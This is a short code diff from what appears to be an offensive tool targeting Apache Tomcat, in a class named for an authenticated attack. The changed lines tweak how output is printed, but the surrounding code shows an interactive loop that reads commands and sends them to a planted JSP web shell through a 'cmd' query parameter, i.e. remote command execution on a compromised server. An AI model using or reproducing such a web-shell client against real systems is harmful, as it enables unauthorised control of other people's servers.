@@ -217,7 +217,9 @@ class authenticated_attack(tomcat):
             cmd = input()
 
             if cmd != "":
-                print(self.execute_webshell_cmd(cmd=cmd))
+                response = self.execute_webshell_cmd(cmd=cmd)
+                if response != "":
+                    print(response)
 
     def execute_webshell_cmd(self, cmd: str):
         response = requests.get(f"{self.url}/web_shell/index.jsp?cmd={cmd}")
